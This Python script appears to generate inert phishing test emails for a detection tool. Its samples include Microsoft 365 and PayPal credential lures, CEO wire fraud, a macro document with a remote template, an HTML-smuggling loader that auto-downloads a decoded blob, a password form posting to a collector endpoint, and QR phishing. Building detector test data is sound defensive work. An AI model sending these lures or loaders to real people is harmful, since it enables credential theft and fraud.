"""Generate the synthetic sample emails in samples/.

Every sample is fake and harmless: recipients use example.com/.org, sender IPs are
RFC 5737 documentation addresses, and "payloads" are plain text that does nothing.

    python tools/make_samples.py          (needs: pip install qrcode pypng)
"""

import base64
import io
import zipfile
import zlib
from email.message import EmailMessage
from email.utils import format_datetime
from datetime import datetime, timedelta, timezone
from pathlib import Path

OUT = Path(__file__).resolve().parent.parent / "samples"
BASE = datetime(2026, 11, 10, 8, 12, 31, tzinfo=timezone.utc)


def received(hops):
    """hops: list of (from_host, ip, by_host, seconds_after_base) oldest first -> headers newest first"""
    out = []
    for frm, ip, by, sec in reversed(hops):
        t = format_datetime(BASE + timedelta(seconds=sec))
        out.append(f"from {frm} ({frm} [{ip}]) by {by} with ESMTPS id {zlib.crc32(f"{frm}{by}".encode()):x}; {t}")
    return out


def build(subject, from_, to, *, text=None, html=None, reply_to=None, return_path=None,
          auth=None, hops=(), extra=None, attachments=(), msgid=None, sec=0, inline=()):
    msg = EmailMessage()
    for r in received(list(hops)):
        msg["Received"] = r
    if auth:
        msg["Authentication-Results"] = auth
    if return_path:
        msg["Return-Path"] = f"<{return_path}>"
    msg["From"] = from_
    msg["To"] = to
    if reply_to:
        msg["Reply-To"] = reply_to
    msg["Subject"] = subject
    msg["Date"] = format_datetime(BASE + timedelta(seconds=sec))
    msg["Message-ID"] = msgid or f"<{zlib.crc32(subject.encode())}@{from_.split('@')[-1].strip('>')}>"
    msg["MIME-Version"] = "1.0"
    for k, v in (extra or {}).items():
        msg[k] = v
    msg.set_content(text or "This message is best viewed as HTML.")
    if html:
        msg.add_alternative(html, subtype="html")
        for data, cid, sub in inline:
            msg.get_payload()[1].add_related(data, maintype="image", subtype=sub, cid=f"<{cid}>")
    for data, name, maintype, subtype in attachments:
        msg.add_attachment(data, maintype=maintype, subtype=subtype, filename=name)
    return msg


def write(name, msg):
    OUT.mkdir(exist_ok=True)
    (OUT / name).write_bytes(msg.as_bytes())
    print("wrote", name)


def zip_bytes(files, comment=b""):
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
        for n, d in files.items():
            z.writestr(n, d)
        z.comment = comment
    return buf.getvalue()


# 1 ── Microsoft 365 credential harvesting --------------------------------------
write("01-microsoft365-password-expiry.eml", build(
    "Action required: your Microsoft 365 password expires today",
    '"Microsoft 365 Security" <no-reply@micros0ft-secure-login.com>',
    "ana.ionescu@example.com",
    reply_to="it-helpdesk@secure-mailbox-support.top",
    return_path="bounce-7731@mail-relay-77.xyz",
    auth=("mx.example.com; spf=softfail (domain of transitioning bounce-7731@mail-relay-77.xyz does not "
          "designate 203.0.113.77 as permitted sender) smtp.mailfrom=mail-relay-77.xyz; dkim=none (message not signed); "
          "dmarc=fail action=quarantine header.from=micros0ft-secure-login.com"),
    hops=[("mail-relay-77.xyz", "203.0.113.77", "mx.example.com", 0), ("mx.example.com", "10.0.4.12", "mailstore.example.com", 2)],
    extra={"X-Mailer": "PHPMailer 6.8.0 (https://github.com/PHPMailer/PHPMailer)"},
    text=("Dear user,\n\nYour Microsoft 365 password will expire within 24 hours. To keep the same password "
          "and avoid losing access to your mailbox, verify your account immediately:\n"
          "https://login.microsoftonline.com\n\nFailure to act will result in your account being suspended.\n\nMicrosoft 365 Security Team"),
    html="""<html><body style="font-family:Segoe UI,Arial">
<div style="display:none;font-size:0">invoice receipt meeting notes newsletter</div>
<img src="https://micros0ft-secure-login.com/assets/ms-logo.png" alt="Microsoft" width="108">
<p>Dear user,</p>
<p>Your <b>Microsoft 365</b> password will <b>expire within 24 hours</b>. To keep the same password and avoid losing access to your mailbox,
please verify your account <b>immediately</b>.</p>
<p><a href="https://micros0ft-secure-login.com/owa/verify?session=8f3a1c&amp;u=ana.ionescu%40example.com"
 style="background:#0067b8;color:#fff;padding:10px 18px;text-decoration:none">https://login.microsoftonline.com</a></p>
<p>Failure to act will result in your account being suspended.</p>
<p>Microsoft 365 Security Team</p>
<img src="https://track.mail-relay-77.xyz/open?id=8f3a1c" width="1" height="1">
</body></html>""",
))

# 2 ── CEO fraud / business email compromise --------------------------------------
write("02-ceo-urgent-wire-transfer.eml", build(
    "Quick favour - are you at your desk?",
    '"Andrei Popescu (CEO)" <andrei.popescu.ceo.office@gmail.com>',
    "finance@example.com",
    reply_to="a.popescu.executive@outlook.com",
    return_path="andrei.popescu.ceo.office@gmail.com",
    auth=("mx.example.com; spf=pass (google.com: domain of andrei.popescu.ceo.office@gmail.com designates 198.51.100.23 as permitted sender) "
          "smtp.mailfrom=gmail.com; dkim=pass header.d=gmail.com header.s=20230601; dmarc=pass (p=NONE) header.from=gmail.com"),
    hops=[("mail-sor-f41.google.com", "198.51.100.23", "mx.example.com", 0)],
    msgid="<CAF7x9k2=Qm1pZ8vH@mail.gmail.com>",
    text=("Hi,\n\nAre you at your desk? I need a quick favour. We are closing a confidential acquisition today and I need you to "
          "process an urgent wire transfer of EUR 48,750 to our new vendor before 3 PM.\n\nThe bank details have changed, I'll send the IBAN "
          "as soon as you confirm. Please keep this strictly confidential and between us until the announcement.\n\n"
          "I'm in meetings all day so email only.\n\nAndrei\nSent from my iPhone"),
))

# 3 ── fake DHL invoice with malicious attachments --------------------------------
docm = zip_bytes({
    "[Content_Types].xml": '<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"/>',
    "word/document.xml": "<w:document/>",
    "word/vbaProject.bin": b"Attribute VB_Name = \"ThisDocument\"\r\n' harmless PhishLens sample - contains no code\r\n",
    "word/_rels/settings.xml.rels": ('<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
                                     '<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" '
                                     'Target="http://198.51.100.66/templates/invoice.dotm" TargetMode="External"/></Relationships>'),
})
archive = zip_bytes({"DHL_Invoice_INV-4471.pdf.js": b"// PhishLens harmless sample file. This script does nothing.\n"})
write("03-dhl-invoice-malware.eml", build(
    "DHL Express: shipment on hold - customs invoice INV-4471",
    '"DHL Express" <invoice@dhl-shipment-notice.top>',
    "office@example.org",
    return_path="invoice@dhl-shipment-notice.top",
    auth="mx.example.org; spf=pass smtp.mailfrom=dhl-shipment-notice.top; dkim=none; dmarc=none header.from=dhl-shipment-notice.top",
    hops=[("vps-4471.dhl-shipment-notice.top", "192.0.2.144", "mx.example.org", 0)],
    text=("Dear customer,\n\nYour parcel is held at customs. Pending delivery fee: 2.99 EUR.\n"
          "Please review the attached invoice and shipping label. The archive is password protected for your security. Password: 4471\n\n"
          "If the fee is not paid within 48 hours the shipment will be returned.\n\nDHL Express Customer Service"),
    attachments=[(archive, "DHL_Invoice_INV-4471.zip", "application", "zip"),
                 (docm, "Shipping_Label_4471.docm", "application", "vnd.ms-word.document.macroEnabled.12")],
))

# 4 ── HTML smuggling attachment -------------------------------------------------
payload = base64.b64encode(b"PhishLens harmless sample payload - this text is all it contains.\n" * 60).decode()
smuggle = f"""<!doctype html><html><head><title>Secure Message</title></head><body>
<h2>Encrypted message from Payroll</h2><p>Loading your secure document…</p>
<form action="https://payroll-portal-docs.web.app/collect" method="post">
<input name="email" placeholder="Work email"><input type="password" name="pw" placeholder="Password"><button>View document</button></form>
<script>
var d = "{payload}";
var b = new Blob([Uint8Array.from(atob(d), c => c.charCodeAt(0))], {{type: "application/octet-stream"}});
var a = document.createElement("a"); a.href = URL.createObjectURL(b); a.download = "Salary_Review_2026.iso"; a.click();
</script></body></html>"""
write("04-html-smuggling-secure-message.eml", build(
    "Salary adjustment letter - secure message",
    '"HR Payroll" <payroll@hr-notifications-portal.com>',
    "mihai.rusu@example.com",
    auth="mx.example.com; spf=pass smtp.mailfrom=hr-notifications-portal.com; dkim=pass header.d=hr-notifications-portal.com; dmarc=pass header.from=hr-notifications-portal.com",
    hops=[("mta2.hr-notifications-portal.com", "203.0.113.200", "mx.example.com", 0)],
    text=("Hello,\n\nYour salary adjustment letter for 2026 is ready to review. For confidentiality it is attached as an encrypted secure message.\n"
          "Open the attachment and sign in with your work account to view it.\n\nHR & Payroll"),
    attachments=[(smuggle.encode(), "Secure_Message_Payroll.html", "text", "html")],
))

# 5 ── QR code phishing (quishing) ----------------------------------------------
try:
    import qrcode
    import qrcode.image.pure

    img = qrcode.make("https://mfa-reset.sharepoint-docs.xyz/enroll?tenant=example&id=55102", image_factory=qrcode.image.pure.PyPNGImage, box_size=6, border=2)
    buf = io.BytesIO()
    img.save(buf)
    qr_png = buf.getvalue()
except ImportError:  # pragma: no cover
    raise SystemExit("pip install qrcode pypng")
write("05-qr-code-mfa-reenrollment.eml", build(
    "MFA re-enrollment required",
    '"IT Service Desk" <servicedesk@example-it-notify.com>',
    "staff@example.com",
    auth="mx.example.com; spf=neutral smtp.mailfrom=example-it-notify.com; dkim=none; dmarc=none header.from=example-it-notify.com",
    hops=[("smtp.example-it-notify.com", "198.51.100.91", "mx.example.com", 0)],
    text="Scan the QR code with your phone camera to re-enroll MFA.",
    html="""<html><body style="font-family:Arial"><p style="font-size:13px">Scan to re-enroll MFA</p>
<img src="cid:qr55102" width="180" height="180" alt=""></body></html>""",
    inline=[(qr_png, "qr55102", "png")],
))

# 6 ── PayPal homograph (Cyrillic "а") ------------------------------------------
homograph = "pаypal.com".encode("idna").decode()  # Cyrillic а → xn--pypal-4ve.com
write("06-paypal-homograph-refund.eml", build(
    "You have received a refund of $389.00",
    '"PayPal" <service@paypal-resolution-center.com>',
    "victim@example.com",
    reply_to="service@paypal-resolution-center.com",
    auth="mx.example.com; spf=pass smtp.mailfrom=paypal-resolution-center.com; dkim=none; dmarc=none header.from=paypal-resolution-center.com",
    hops=[("mx1.paypal-resolution-center.com", "203.0.113.19", "mx.example.com", 0)],
    text="Dear customer, a refund of $389.00 is waiting. Claim it here: https://bit.ly/3pp-refund",
    html=f"""<html><body><p>Dear customer,</p><p>A refund of <b>$389.00</b> is waiting for you. Claim your refund within 48 hours:</p>
<p><a href="https://{homograph}/signin/refund?case=PP-D-77120">Log in to PayPal</a></p>
<p>Or use this link: <a href="https://bit.ly/3pp-refund">https://www.paypal.com/refund</a></p>
<p>PayPal Resolution Center</p></body></html>""",
))

# 7 ── legitimate newsletter (should score low) ---------------------------------
write("07-legit-github-notification.eml", build(
    "[GitHub] A new SSH key was added to your account",
    '"GitHub" <noreply@github.com>',
    "dev@example.com",
    return_path="bounces+1234-abcd=example.com@sgmail.github.com",
    auth=("mx.example.com; spf=pass (domain of sgmail.github.com designates 192.0.2.10 as permitted sender) smtp.mailfrom=sgmail.github.com; "
          "dkim=pass header.d=github.com header.s=pf2023; dmarc=pass (p=REJECT) header.from=github.com"),
    hops=[("o1.sgmail.github.com", "192.0.2.10", "mx.example.com", 0), ("mx.example.com", "10.0.0.5", "mailstore.example.com", 1)],
    msgid="<6727f1a0c3b1e_3a2b1d8c41734@lowworker-7d9c.mail>",
    extra={"DKIM-Signature": "v=1; a=rsa-sha256; c=relaxed/relaxed; d=github.com; s=pf2023; h=from:to:subject:date; bh=abc=; b=def="},
    text=("Hey dev!\n\nA new public SSH key was added to your account (laptop-2026).\n\nIf you did this, you can ignore this email.\n"
          "If not, review your keys at https://github.com/settings/keys\n\nThanks,\nThe GitHub Team"),
    html="""<html><body><p>Hey dev!</p><p>A new public SSH key was added to your account (<code>laptop-2026</code>).</p>
<p>If you did this, you can ignore this email. If not, <a href="https://github.com/settings/keys">review your SSH keys</a>.</p>
<p>Thanks,<br>The GitHub Team</p><p style="color:#666;font-size:12px"><a href="https://github.com/settings/notifications">Notification settings</a> ·
<a href="https://docs.github.com/articles/github-privacy-statement">Privacy</a></p></body></html>""",
))
